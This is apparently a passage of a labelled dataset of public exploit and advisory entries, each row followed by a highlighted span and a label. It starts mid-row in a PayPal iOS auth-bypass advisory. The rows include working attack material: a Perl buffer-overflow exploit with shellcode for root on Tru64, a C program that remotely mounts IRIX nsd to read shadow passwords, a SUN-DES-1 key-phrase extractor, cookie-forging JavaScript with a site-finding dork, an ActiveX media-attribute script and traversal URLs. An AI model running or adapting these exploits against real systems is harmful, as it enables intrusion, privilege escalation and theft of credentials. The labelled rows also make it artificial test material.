card ending in 4567 is set as the Primary over 1234, it will still attempt to pay money out of your  PayPal balance, before it attempts to charge your credit card). The funding hierarchy is a balance in the PayPal account; a  PayPal credit account, PayPal Extras, PayPal SmartConnect, PayPal Extras Master Card or Bill Me Later (if selected as primary  funding source) (It can bypass the Balance); a verified bank account; other funding sources, such as non-PayPal credit cards. The recipient of a PayPal transfer can either request a check from PayPal, establish their own PayPal deposit account or request  a transfer to their bank account.  PayPal is an acquirer, performing payment processing for online vendors, auction sites, and other commercial users, for which it  charges a fee. It may also charge a fee for receiving money, proportional to the amount received. The fees depend on the currency  used, the payment option used, the country of the sender, the country of the recipient, the amount sent and the recipient s account  type. In addition, eBay purchases made by credit card through PayPal may incur extra fees if the buyer and seller use different currencies.  On October 3, 2002, PayPal became a wholly owned subsidiary of eBay. Its corporate headquarters are in San Jose, California, United  States at eBay s North First Street satellite office campus. The company also has significant operations in Omaha, Nebraska, Scottsdale,  Arizona, and Austin, Texas, in the United States, Chennai, Dublin, Kleinmachnow (near Berlin) and Tel Aviv. As of July 2007, across  Europe, PayPal also operates as a Luxembourg-based bank.  On March 17, 2010, PayPal entered into an agreement with China UnionPay (CUP), China s bankcard association, to allow Chinese consumers  to use PayPal to shop online.PayPal is planning to expand its workforce in Asia to 2,000 by the end of the year 2010. Between December 4ñ9, 2010, PayPal services were attacked in a series of denial-of-service attacks organized by Anonymous in retaliation  for PayPal s decision to freeze the account of WikiLeaks citing terms of use violations over the publication of leaked US diplomatic cables.  (Copy of the Homepage: www.paypal.com) [http://en.wikipedia.org/wiki/PayPal]   Abstract Advisory Information: ============================== The Vulnerability Laboratory Research Team discovered a security auth protection mechanism bypass vulnerability in the PayPal Inc iOS Mobile Application.   Vulnerability Disclosure Timeline: ================================== 2014-10-09:	Public Disclosure (Vulnerability Laboratory)   Discovery Status: ================= Published   Affected Product(s): ==================== PayPal Inc Product: iOS Mobile Application - Banking 4.6.0    Exploitation Technique: ======================= Remote   Severity Level: =============== High   Technical Details & Description: ================================ An auth restriction bypass vulnerability has been discovered in the official PayPal Inc mobile webapplication and api.  The vulnerability allows to bypass a filter or restrction of the online-service to get unauthorized paypal account access.  The security vulnerability is located in the mobile api auth procedure of the paypal online-service. The mobile app api does not  check for already restricted/blocked application accounts. Remote attackers are able to login through the mobile api with paypal  portal restriction to access account information or interact with the compromised account.  If a paypal user tries several times to login with a wrong password/user combination the paypal account will temporarily be closed  for security reasons. When this happens the user needs to answer a secret question to get the account open again. Even if the account  is temporarily closed it is possible to get access to the account via the paypal mobile app client through the API.   The client API checks only if the account exists, the API does not check a part- or full blocking of the account. It is possible for  the blocked user to get access to his paypal account and is able to make transactions and he can send money from the account. The mobile  iPhone / iPad Paypal App does need a security upgrade to ensure that the status of an account is also verified and how the App reacts when  such an event takes place. This would ensure that no one can have access via the mobile client to a blocked account. In the Paypal database  there are several preferences for an account to verify the status of the account. These preferences need to be used to check also the account  status on the mobile client API. There is another exception which drops a push message on iOS devices (iphone & ipad) which refers to the main  paypal website but it is only a temporary solution and no possibility to block account stable.  During the pentest the researcher revealed that he was able to access the blocked test account through the mobile application api. At the end the  researcher was able to interact through the mobile app by easily accessing the information of the paypal account x01445@gmail.com.  The security risk of the auth bypass restriction vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 6.2.  Exploitation of the vulnerability requires a restricted/blocked account of the paypal application without user interaction. Successful exploitation  of the issue results in auth restriction bypass through the official mobile paypal app api.  Vulnerable Service(s): 				[+] PayPal Inc Vulnerable Software(s): 				[+] PayPal iOS App (iPhone & iPad) v4.6.0 Vulnerable Module(s): 				[+] API Affected Module(s): 				[+] Login Verification – (Auth)   Proof of Concept (PoC): ======================= The auth bypass restriction vulnerability can be exploited by remote attackers without user interaction but with low privileged application user account.  For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.  Site: PayPal Inc (www.paypal.com) Test Account: x01445@gmail.com 01x445@gmail.com Mobile Client: https://itunes.apple.com/us/app/paypal/id283646709  #1 Manual steps to reproduce the issue with security question 1. Register a regular PayPal account linked to a banking account 2. Go to the login & provoke the ask for security questions after several wrong forced passwords login requests 3. It is also possible to do it when logged into the account and provoke via transaction cancels & co. 4. Now, try to login again and we see the ""Security Question"" module 5. We switch to our iphone or ipad device and download & install the new paypal mobile application v4.6.0 6. Open the mobile application on your ipad or iphone device and login to your account Note: The security protection mechanism of the main paypal core application disallows to login without the verification attempt of the security question module! 7. The application allows the user to login via the mobile paypal app api without auth cancel or sec question popup 8. We login successful! 9. Now, the attacker can handle transactions, send money, request money, add funds, change address or include new cards 10. Successful reproduced! #2 Manual steps to reproduce the issue without security question 1. Install the application to your iOS device (ipad or iphone) 2. Register a paypal inc user account 3. Solve a transaction and provoke an incident that the account get blocked 4. Now, login to the ios device and start the paypal application 5. Include the blocked login credentials and press the login button 6. The service grants access through the mobile api without processing to drop any exception to prevent the access  Note: Now the attacker is able to request the stored data of the paypal user in the portal even if the service is restricted accessable. Regular the service must block you like when you login to the portal but in case of the issue the api grants the access because of missing value check.  Security Video Demonstration Description The video shows two blocked accounts. The first is the 01x445@gmail.com pp test account and the second is the x01445@gmail.com pp test account.  The first one is nulled and frozen and the second one has also been blocked. The video shows in the first steps both login profiles with are unsuccessful. After providing to demonstrate that the x01445@gmail.com account is not allowed to access the portal we show how to unauthorized  access the account information even if the service has blocked to login through the main paypal. The researcher demonstrates how to bypass the restricted account to get access and interact via api.  Reference(s): Links https://itunes.apple.com/us/app/paypal/id283646709 https://www.paypal.com  Resource(s): 		../Paypal Mobile API Auth Bypass Restriction.wmv  Picture(s): 		../1.jpg – 11.jpg 		../1.png –   Solution - Fix & Patch: ======================= The security vulnerability can be patched by a secure recognition of the validation procedure when processing to request restriction values through api in the paypal account system. The same exception that popup for the account 01x445@gmail.com which is nulled needs to prevent the same problem of the account x01445@gmail.com. The account system itself should never allow to grant access for an account that has been restricted in the main service that manages the paypal users. The bug does not only hurt the security policy it is an infrastructure bug too.   Security Risk: ============== The security risk of the protection mechanism bypass vulnerability via mobile api is estimated as high.   Credits & Authors: ================== Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@vulnerability-lab.com)   Disclaimer & Information: ========================= The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either  expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers  are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even  if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation  of liability for consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break  any vendor licenses, policies, deface websites, hack into databases or trade with fraud/stolen material.  Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       		- admin@evolution-sec.com Section:    dev.vulnerability-db.com	 	- forum.vulnerability-db.com 		       		- magazine.vulnerability-db.com Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to  electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by  Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website  is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact  (admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.  				Copyright © 2014 | Vulnerability Laboratory [Evolution Security]    --  VULNERABILITY LABORATORY RESEARCH TEAM DOMAIN: www.vulnerability-lab.com CONTACT: research@vulnerability-lab.com",set one of the funding sources as Primary,1
21774,"HP Tru64 4.0/5.0/5.1 - _XKB_CHARSET Local Buffer Overflow source: https://www.securityfocus.com/bid/5648/info  Tru64 is a commercially available Unix operating system originally developed by Digital. It is distributed and maintained by HP.  A buffer overflow has been discovered in the _XKB_CHARSET library. A number of programs depend on the library, including dxconsole, dxpause and dtsession. Because of this flaw, it may be possible for a local user to execute arbitrary instructions. This could lead to the execution of attacker-supplied code, and elevated privileges.   #!/usr/bin/perl -w # # Tru64 5.1 _XKB_CHARSET # # stripey (stripey@snosoft.com) - 10/07/2002 #                                   $tgts{""0""} = pack(""l"",0x40010250)."":/usr/bin/X11/dxconsole:uid=root""; $tgts{""1""} = pack(""l"",0x40012584)."":/usr/bin/X11/dxpause:uid=root""; $tgts{""2""} = pack(""l"",0x400101e4)."":/usr/dt/bin/dtsession:euid=root"";                                    unless (($target,$offset,$align) = @ARGV,$align) {                                                       print ""-""x72;         print ""\n      Tru64 _XKB_CHARSET overflow, stripey\@snosoft.com, 03/07/2002\n"";         print ""-""x72;         print ""\n\nUsage: $0 <target> <offset> <align>\n\nTargets:\n\n"";                                            foreach $key (sort(keys %tgts)) {                 ($a,$b,$c) = split(/\:/,$tgts{""$key""});                 print ""\t$key. $b ( $c )\n"";         }                 print ""\n"";         exit 1; }               ($a,$b) = split(/\:/,$tgts{""$target""});                                    print ""*** Target: $b, Offset: $offset, Align: $align ***\n\n"";                                    $ret = pack(""ll"",(unpack(""l"",$a)+$offset), 0x1);                                                  $sc .= ""\x30\x15\xd9\x43\x11\x74\xf0\x47\x12\x14\x02\x42""; $sc .= ""\xfc\xff\x32\xb2\x12\x94\x09\x42\xfc\xff\x32\xb2""; $sc .= ""\xff\x47\x3f\x26\x1f\x04\x31\x22\xfc\xff\x30\xb2""; $sc .= ""\xf7\xff\x1f\xd2\x10\x04\xff\x47\x11\x14\xe3\x43""; $sc .= ""\x20\x35\x20\x42\xff\xff\xff\xff\x30\x15\xd9\x43""; $sc .= ""\x31\x15\xd8\x43\x12\x04\xff\x47\x40\xff\x1e\xb6""; $sc .= ""\x48\xff\xfe\xb7\x98\xff\x7f\x26\xd0\x8c\x73\x22""; $sc .= ""\x13\x05\xf3\x47\x3c\xff\x7e\xb2\x69\x6e\x7f\x26""; $sc .= ""\x2f\x62\x73\x22\x38\xff\x7e\xb2\x13\x94\xe7\x43""; $sc .= ""\x20\x35\x60\x42\xff\xff\xff\xff"";                                                   $buf_a  = ""A""x256; $buf_a .= $ret;  $buf_b  = ""B""x$align; if ($target eq ""2"" ) {              $buf_b .= pack(""l"",0x47ff041f)x56; } else {         $buf_b .= pack(""l"",0x47ff041f)x3750; } $buf_b .= $sc;                              $ENV{""_XKB_CHARSET""} = $buf_a; $ENV{""HOME""} = $buf_b;                             exec(""$b"");",malicious code,1
19316,"SGI IRIX 6.5.2 - 'nsd' Information Gathering /* source: https://www.securityfocus.com/bid/412/info  A vulnerability has been discovered in the nsd service, as included by SGI in Irix 6.5.x. The vulnerability allows remote users to access potentially sensitive pieces of information, including, but not limited to, NIS map information, shadow password files, and remote connections.  */   /******************************************************************************  IRIX 6.5 nsd virtual filesystem exploit  Author: Jefferson Ogata (JO317) <ogata@pobox.com>  Please note that this program comes with NO WARRANTY WHATSOEVER. Your use of this program constitutes your complete acceptance of all liability for any damage or loss caused by the aforesaid use. It is provided to the network community solely to document the existence of a vulnerability in the security implementations of certain versions of IRIX, and may not be used for any illicit purpose. Many of the details of the bug this program exploits have been available to users of SGI's online support system since February 1999. The current revision of IRIX (6.5.3) corrects this bug, at least enough to stop this particular exploit, and I strongly encourage you to bring your systems up to date as quickly as possible.  With IRIX 6.5, SGI has moved all name services, NIS services, and DNS lookups into a userland process called nsd, which exports the results of the queries it fields into a virtual filesystem. The virtual filesystem is normally mounted onto the directory /ns by the program /sbin/nsmount, which is invoked by nsd on startup. The nsd daemon itself is exporting the filesystem via NFS3 over a dynamically bound UDP port -- rather than a well-known or settable one -- typically in the 1024-1029 range. On a desktop system, 1024 is a good bet, since nsd is usually the first RPC/UDP service to be started.  The NFS filesystem is not registered with mountd, so there is no way to query mountd for a mount filehandle. But because the NFS port is fairly easy to discover through port scanning, and because the mount filehandle nsd uses is simply a string of 32 zeroes, it is trivial to mount the nsd filesystem from a host anywhere on the Internet. nsd will serve an array of NFS requests to anyone. Furthermore, because the service's NFS port is bound dynamically, it is difficult to protect it with a firewall; it may change from one system start to another, or if the daemon is killed and restarted.  This program can successfully mount the nsd-exported virtual filesystem from a remote host onto a machine running IRIX 6.4 or higher. It makes use of the MS_DOXATTR mount flag defined in IRIX 6.4 and higher. I do not know what this flag does at the NFS protocol level, but it allows the client to ask the NFS server not to enforce certain permissions controls against the client. I don't know whether any other vendor NFS client systems support this flag. A clever person might write a userland NFS client that would accept an initial handle, NFS port, etc. as arguments.  On an SGI with SGI C compiler, compile with:      cc -o nsdadv nsdadv.c  Run it this way:      nsdadv /mnt sucker.example.com 1024  with obvious substitutions.  So what are the security implications of this? Well, at the very least, the nsd filesystem on an NIS server reveals the NIS domain name, and what maps it contains, as well as what classes are being used.  By exploring the filesystem shortly after it has been mounted I have been able to retrieve data that should be hidden from me, including shadow password entries from a remote system's shadow file.  Beyond retrieving keys and maps, you can also monitor the filesystem for changes. A great deal of information is leaked through the contents of the nsd filesystem. For example, if host A looks up a host B's IP address, a file named B will appear in the /.local/hosts.byname directory in A's nsd filesystem. The file's contents will be the IP address.  By the way, though you be unable to chdir into a particular location in the nsd filesystem, you may yet succeed under slightly different conditions. Eventually you can do it. I'm not sure why or when, but nsd gets picky sometimes. Eventually it relents. Specifically, I've found that the entire nsd filesystem appears readable for a few seconds after it is initially mounted. If you can't look at something, unmount the filesystem, remount it, and try again immediately. It also seems that a stat() is sometimes required before a chdir(). Your mileage may vary, but keep trying. You may wish to write a script to mount the nsd filesystem, explore and take inventory of its contents, and unmount the filesystem quickly.  Once you've chdir'd into a directory, it appears you can always read it, although you can't necessarily stat its contents. This suggests a strategy of spawning a group of processes each with its cwd set to a subdirectory of the nsd filesystem, in order to retain visibility on the entire filesystem. Each process would generate an inventory of its cwd, and then monitor it for changes. A Perl script could do this well.  Another thing: it is possible to create an empty file in nsd's exported filesystem simply by stat()ing a nonexistent filename. This suggests a potential DoS by creating many files in a directory.  Remember that the system keeps a local cache in /var/ns, so you may have to wait for cached entries on the target host to expire before you'll see them reappear in the virtual filesystem.  For some fairly extensive info on the nsd implementation, take a look at:      http://www.bitmover.com/lm/lamed_arch.html  ******  What got me into all this was that I found I could no longer run services chrooted if they required DNS. It took considerable effort to come up with a solution to this. This was a fundamental change from IRIX 6.4, and I know I'm not the only one who finds the nsd implementation to be a generally unpleasant direction, in part because it causes umount -t nfs to break system database services. I give SGI points for creativity -- in one sense, using NFS as a database access system is a very slick approach. But the database needs a security model, and the model needs to be implemented correctly. Neither of these needs appears to have been met.  So how could SGI fix this?  Without going back, SGI could at least make nsd respond only to queries from localhost (see note below about IRIX 6.5.3). The problem here is that they actually intend to support remote mounts in later releases, in order to supplement or supplant other means of distribution. The web documents indicate this.  They could create a well-randomized mount filehandle for the filesystem and pass that to nsmount. Then you couldn't remotely mount the filesystem without guessing the handle -- nontrivial with a 32-byte handle.  At the very least, they should provide libraries of regular BIND resolver routines, file-based getpwent, etc. routines, so one could choose the resolution strategy at link time, perhaps by modifying the shared library path.  ******  With IRIX release 6.5.3, SGI appears to have fixed this problem, at least to some degree. The exploit does not appear to work as it does against 6.5.2. Further testing is needed, and the behavior should be watched carefully in future versions of IRIX.  suggests a potential DoS by creating many files in a directory.  Remember that the system keeps a local cache in /var/ns, so you may have to wait for cached entries on the target host to expire before you'll see them reappear in the virtual filesystem.  For some fairly extensive info on the nsd implementation, take a look at:      http://www.bitmover.com/lm/lamed_arch.html  ******  What got me into all this was that I found I could no longer run services chrooted if they required DNS. It took considerable effort to come up with a solution to this. This was a fundamental change from IRIX 6.4, and I know I'm not the only one who finds the nsd implementation to be a generally unpleasant direction, in part because it causes umount -t nfs to break system database services. I give SGI points for creativity -- in one sense, using NFS as a database access system is a very slick approach. But the database needs a security model, and the model needs to be implemented correctly. Neither of these needs appears to have been met.  So how could SGI fix this?  Without going back, SGI could at least make nsd respond only to queries from localhost (see note below about IRIX 6.5.3). The problem here is that they actually intend to support remote mounts in later releases, in order to supplement or supplant other means of distribution. The web documents indicate this.  They could create a well-randomized mount filehandle for the filesystem and pass that to nsmount. Then you couldn't remotely mount the filesystem without guessing the handle -- nontrivial with a 32-byte handle.  At the very least, they should provide libraries of regular BIND resolver routines, file-based getpwent, etc. routines, so one could choose the resolution strategy at link time, perhaps by modifying the shared library path.  ******  With IRIX release 6.5.3, SGI appears to have fixed this problem, at least to some degree. The exploit does not appear to work as it does against 6.5.2. Further testing is needed, and the behavior should be watched carefully in future versions of IRIX.  ******************************************************************************/    #include <stdio.h> #include <string.h> #include <malloc.h> #include <mntent.h> #include <sys/types.h> #include <rpc/types.h> #include <sys/fstyp.h> #include <sys/fsid.h> #include <sys/mount.h> #include <sys/fs/nfs.h> #include <sys/fs/nfs_clnt.h> #include <netinet/in.h> #include <netdb.h> #include <arpa/inet.h>  /* Filesystem type name for nsd-exported filesystem. */ #define NSD_FSTYPE      ""nfs3""  /* File the records mounted filesystems. */ #define MTAB_FILE       ""/etc/mtab""  /* Socket address we'll fill in with our destination IP and port. */ struct sockaddr_in sin;  /* All zero file handle. This appears to be the base handle for the nsd    filesystem. Great security, huh? */ unsigned char fh[NFS_FHSIZE] = { 0 };  /* NFS mount options structure to pass to mount(2). The meanings of these    are documented to some extent in /usr/include/sys/fs/nfs_clnt.h. The    flags field indicates that this is a soft mount without log messages,    and to set the initial timeout and number of retries from fields in    this structure. The fh field is a pointer to the filehandle of the    mount point, whose size is set by fh_len. As noted above, the mount    point filehandle is just 32 zeroes. */ struct nfs_args nx = {     &sin,               /* addr */     (fhandle_t *) fh,   /* fh */     NFSMNT_SOFT|NFSMNT_TIMEO|NFSMNT_RETRANS|NFSMNT_NOAC,        /* flags */     0,                  /* wsize */     0,                  /* rsize */     100,                /* timeo */     2,                  /* retrans */     0,                  /* hostname */     0,                  /* acregmin */     0,                  /* acregmax */     0,                  /* acdirmin */     0,                  /* acdirmax */     0,                  /* symttl */      { 0 },              /* base */      0,                  /* namemax */     NFS_FHSIZE,         /* fh_len */     /* On IRIX 6.4 and up there are also the following... */                         /* bdsauto */                         /* bdswindow */     /* On IRIX 6.5 there are also the following... */                         /* bdsbuflen */                         /* pid */                         /* maxthreads */ };  void usage (void) {     fprintf (stderr, ""usage: nsmount_remote directory host port\n\n"");     fprintf (stderr, ""NFS-mounts the virtual filesystem exported by nsd on <host> via NSD daemon\n"");     fprintf (stderr, ""port <port> onto <directory>.\n\n"");     exit (1); }  int main (int argc, char **argv) {     char                *dir;     char                *host;     char                *ports;     int                 port;     struct hostent      *h;     int                 fstype;     FILE                *mtabf;     struct mntent       mnt =     {         0,         0,         NSD_FSTYPE,         ""soft,timeo=100,retrans=2"",         0,         0,     };      if (argc != 4)         usage ();      dir = argv[1];     host = argv[2];     port = atoi ((ports = argv[3]));      /* Prepare for host lookup. */     memset ((void *) &sin, 0, sizeof (sin));     sin.sin_family = 2;     sin.sin_port = port;      /* Look up the host. */     if (inet_aton (host, &sin.sin_addr))         ;     else if ((h = gethostbyname (host)))     {         unsigned long   *l = (unsigned long *) *(h->h_addr_list);         sin.sin_addr.s_addr = l[0];     }     else     {         fprintf (stderr, ""Cannot resolve host %s.\n"", host);         return 1;     }      /* Get filesystem type index for nsd filesystem type. */     if ((fstype = sysfs (GETFSIND, NSD_FSTYPE)) < 0)     {         perror (""sysfs ("" NSD_FSTYPE "")"");         return 1;     }      fprintf (stderr, ""Mounting nsd "" NSD_FSTYPE "" fs from %s(%s):%d onto %s\n"",         host, inet_ntoa (sin.sin_addr), port, dir);      /* These flags are documented in /usr/include/sys/mount.h. MS_DOXATTR        means ""tell server to trust us with attributes"" and MS_DATA means        ""6-argument mount"".         MS_DOXATTR is a mount option in IRIX 6.4 and up. The attack doesn't        seem to work without this option. So even though this program will        compile on IRIX 6.2, you need to use an IRIX 6.4 or higher OS to        attack nsd. */     if (mount (dir, dir, MS_DOXATTR|MS_DATA, (char *) fstype, &nx, sizeof (nx))         != 0)     {         perror (""mount"");         return 1;     }      /* Record mount point in /etc/mtab. */     mnt.mnt_fsname = malloc (strlen (host) + sizeof ("":nsd@"") + strlen (ports) + 1);     sprintf (mnt.mnt_fsname, ""%s:nsd@%s"", host, ports);     mnt.mnt_dir = dir;     if (!(mtabf = setmntent (MTAB_FILE, ""r+"")))     {         perror (""setmntent"");         return 1;     }     if (addmntent (mtabf, &mnt) < 0)     {         perror (""addmntent"");         return 1;     }     if (endmntent (mtabf) < 0)     {         perror (""endmntent"");         return 1;     }      return 0; }",creating many files in a directory,1
20560,"SSH 1.2.x - Secure-RPC Weak Encrypted Authentication // source: https://www.securityfocus.com/bid/2222/info  SSH is a package designed to encrypt traffic between two end points using the IETF specified SSH protocol. The SSH1 package is distributed and maintained by SSH Communications Security.  A problem exists which could allow the discovery of the secret key used to encrypt traffic on the local host. When using SUN-DES-1 to share keys with other hosts on the network to facilitate secure communication via protocols such as NFS and NIS+, the keys are shared between hosts using the private key of the user and a cryptographic algorithm to secure the contents of the key, which is stored on the NIS+ primary. The problem occurs when the key is encrypted with the SUN-DES-1 magic phrase prior to having done a keylogin (the keyserv does not have the users DH private key). A design flaw in the software that shares the key with the NIS+ master will inconsistently return the correct value for an attempted keyshare that has failed. A step in the private key encryption process is skipped, and the users private key is then encrypted only with the public key of the target server and the SUN-DES-1 magic phrase, a phrase that is guessable due to the way it is generated. A user from the same host can then execute a function that returns another users magic phrase, and use this to decrypt the private key of the victim. This makes it possible for a user with malicious intent to gain knowledge of a users secret key, and decrypt sensitive traffic between two hosts, with the possibility of gaining access and elevated privileges on the hosts and/or NIS+ domain. This reportedly affects the SSH2 series of the software package.   #include <stdio.h> #include <rpc/rpc.h>  void die (char *msg) {   fprintf(stderr,""%s\n"",msg);   exit(1); }  main (int argc, char **argv) {   char buf[MAXNETNAMELEN + 1];   des_block block;   uid_t uid;   char *netname;    if (argc < 3)     die(""supply uid and netname"");    sscanf(argv[1], ""%d"", &uid);   netname = argv[2];   memset(buf, 0, sizeof(buf));   snprintf(buf, sizeof(buf), ""ssh.%04X"", uid);   memcpy(block.c, buf, sizeof(block.c));   if (key_encryptsession(netname, &block) != 0)     die(""key_encryptsession failed"");   printf(""SUN-DES-1 magic phrase (uid %d, netname %s):\n  %08X%08X\n"",          uid,          netname,          ntohl(block.key.high),          ntohl(block.key.low)); }",decrypt the private key of the victim,1
5888,"CCLeague Pro 1.2 - Insecure Cookie Authentication -[*]+================================================================================+[*]- -[*]+         CCLeague Pro <= 1.2 Insecure Cookie Authentication Vulnerability       +[*]- -[*]+================================================================================+[*]-    [*] Discovered By: t0pP8uZz [*] Discovered On: 19 JUNE 2008 [*] Script Download: http://castillocentral.com/ [*] DORK: ""Powered by CCLeague Pro""  (alot of sites removed dork, so find another)    [*] Vendor Has Not Been Notified!    [*] DESCRIPTION:   	CCLeage Pro 1.2 and all prior versions suffer from multiple insecure cookie validation vulnerabilitys. 	 	Lets take a look at a line from the ""admin.php"" file from ""CCLeage Pro 1.2""  	CODE LINE 52 (admin.php):  		if($_COOKIE['PHPSESSID'] == session_id(  ) && $_COOKIE['type'] == ""admin"") { .. }  	As we can see above, the script checks to see if a cookie is set and matches a value, as we know this is very easy to bypass by creating a cookie, 	but now what above the ""$_COOKIE['PHPSESSID'] == session_id(  )"" how do we bypass this you ask?  	well in some versions this part doesnt even exist, but most hosts are running the upto date versions so we still need a way to bypass.  	anyway, the php function session_id checks/returns the PHPSESSID if any, and here it is returning the sessionid, since we havent created any session 	the function will return """" (not null), so all we need to do is make our PHPSESSID match this, and since its grabbing it from a cookie thats simple. 	 	at the minute our PHPSESSID will be some random hash, so we can simply change this by overwriting the cookie.  	See the javascript code below in a second to successfully exploit this.  	Once you have run the javascript code in your browser, you will be able to visit the ""admin.php"" area without having to login, but now 	you probarly see alot of errors, this is because the script attempts to load the admin preferences based on a cookie, since we dont have this cookie set 	its pulling non-existent data from the mysql database.  	so once again we need to set another cookie which needs to contain a existing admins email address, this should be too hard to obtain from sniffing around 	the site.  	here is the line of code from the admin.php which attempts to select the admin config from the db.  	CODE LINE 67 (admin.php): $admininfo = mysql_query(""SELECT * FROM "".$_CONF['tprefix'].""administrators WHERE contact_email = '$_COOKIE[u]' LIMIT 0,1"");	  	there is also a sql injection in the above line, if magic quotes are off, so you rippers dont bother reposting that has a seperate vulnerability.  	Thats about it, Check below for the javascript code which will craft the cookies for you.  		Goodluck!    [*] Vulnerability/Javascript: 	 	javascript:document.cookie = ""type=admin; path=/""; document.cookie = ""PHPSESSID=; path=/""; // this will create one cookie and null the other 	javascript:document.cookie = ""u=admin@domain.com; path=/""; // replace the email with a existent admin email from the site, if this isnt correct your not gona get very far.    [*] NOTE/TIP:    	Use the dork and find a site, navigate to the site, once at the site run the above javascript code (paste into your address bar), dont forget 	to replace the email in the second javascript line.  	after you have done the above steps visit the admin area at ""admin.php""    [*] GREETZ:   	milw0rm.com, h4ck-y0u.org, Offensive-Security.com, CipherCrew !    [-] peace,   	t0pP8uZz    -[*]+================================================================================+[*]- -[*]+         CCLeague Pro <= 1.2 Insecure Cookie Authentication Vulnerability       +[*]- -[*]+================================================================================+[*]-  # milw0rm.com [2008-06-21]",creating a cookie,1
25031,"Microsoft Windows Media Player 9.0 - ActiveX Control Media File Attribute Corruption source: https://www.securityfocus.com/bid/12031/info  The Windows Media Player ActiveX control is prone to a security weakness. The issue is that the control may be abused by a Web page to change attributes of media files (such as MP3). An attacker can influence attributes such as the artist, song name, or album name.  It is possible to exploit this weakness to inject malicious script code into these attributes. If this issue was combined with a vulnerability that could force Internet Explorer to interpret the injected script code, it may be possible to execute malicious script code in the Local Zone. Such an attack would lead to execution of arbitrary code on computers that do not have this Zone locked down.  This issue is reported to affect Windows Media Player 9. It reportedly does not work on computers running Windows XP SP2 when the attack is executed from a remote source. This is likely due to additional browser security measures in Windows XP SP2.   <object style=""display:none;"" classid=""clsid:6BF52A52-394A-11D3-B153-00C04F79FAA6"" id=""WindowsMediaPlayer""> <param name=""autoStart"" value=""1""> <param name=""url"" value=""file://c:\program files\winamp\winamp.m3u""> <param name=""mute"" value=""1""> </object>  <script>  note = 'Look at yourself and find the mortality of your body';  setTimeout( function(){ if (WindowsMediaPlayer.currentMedia.sourceURL!='c:\\program files\\winamp\\winamp.m3u') { artist = WindowsMediaPlayer.currentMedia.getItemInfo(""Artist""); title = WindowsMediaPlayer.currentMedia.getItemInfo(""Title""); album = WindowsMediaPlayer.currentMedia.getItemInfo(""Album""); texxt = """"; if (artist!=note) { if (artist!="""") texxt='I like '+artist+'!\n'; if (title!="""") texxt=texxt+'I think '+title+' is the best song'; if ((title!="""")&&(album!="""")) texxt=texxt+' from '; if (album!="""") texxt=texxt+'My favorite album ""'+album+'"".\n'; else texxt=texxt+'.\n'; texxt=texxt+'I have it on my computer ('+WindowsMediaPlayer.currentMedia.sourceURL+'), I guess you have it too! ;)'; alert(texxt); } WindowsMediaPlayer.currentMedia.setItemInfo(""Artist"",note); alert('done!\nplay '+WindowsMediaPlayer.currentMedia.sourceURL+' by a player and take a look at artist name, it must be changed!'); WindowsMediaPlayer.controls.stop(); WindowsMediaPlayer.controls.play(); } else alert('Can\'t find winamp default playlist!\nMost probably the winamp is not installed in c:\\program files\\winamp directory.'); } ,2000); </script>   </body></html>",inject malicious script code into these attributes,1
4971,"Web Wiz Rich Text Editor 4.0 - Multiple Vulnerabilities ########################## WwW.BugReport.ir ########################################### # #      AmnPardaz Security Research Team # # Title: Web Wiz Rich Text Editor(TM) # Vendor: http://www.webwizguide.com/ # Bug: Directory traversal + HTM/HTML file creation on the server # Vulnerable Version: 4.0 # Exploit: Available # Fix Available: No! Fast Solution is available. ###################################################################################   #################### - Description: #################### Web Wiz Rich Text Editor (RTE) is a free WYSIWYG HTML Rich Text Editor that replaces standard textarea's with an advanced Word style HTMLarea.  #################### - Vulnerability: #################### Input passed to the FolderName parameter in ""RTE_file_browser.asp"" is not properly sanitised before being used. This can be exploited to list directories, list txt and list zip files through directory traversal attacks. Also, ""RTE_file_browser.asp"" does not check user's session and an unauthenticated attacker can perform this attack. Moreover, by using ""RTE_popup_save_file.asp"" attacker can make his/her HTML or HTM file on the server, so this can be used in XSS attacks or making fake pages.  -POC: http://[WebWiz RTE]/RTE_file_browser.asp?look=save&sub=\.....\\\.....\\\.....\\\.....\\\.....\\\ http://[WebWiz RTE]/RTE_popup_save_file.asp  #################### - Fast Solution : #################### 1- You can see below lines in ""RTE_file_browser.asp""  	'Stip path tampering for security reasons 	strSubFolderName = Replace(strSubFolderName, ""../"", """", 1, -1, 1) 	strSubFolderName = Replace(strSubFolderName, ""..\"", """", 1, -1, 1) 	strSubFolderName = Replace(strSubFolderName, ""./"", """", 1, -1, 1) 	strSubFolderName = Replace(strSubFolderName, "".\"", """", 1, -1, 1)  Only add this to them: 	strSubFolderName = Replace(strSubFolderName, ""/"", ""\"", 1, -1, 1) 	strSubFolderName = Replace(strSubFolderName, ""\\"", ""\"", 1, -1, 1) 	strSubFolderName = Replace(strSubFolderName, "".."", """", 1, -1, 1)	 2- Rename ""RTE_popup_save_file.asp"" till main solution by vendor  #################### - Credit : #################### Original Advisory: http://www.bugreport.ir/?/31 AmnPardaz Security Research & Penetration Testing Group Contact: admin[4t}bugreport{d0t]ir WwW.BugReport.ir WwW.AmnPardaz.com  # milw0rm.com [2008-01-23]","using ""RTE_popup_save_file.asp"" attacker can make his/her HTML or HTM file on the server",1
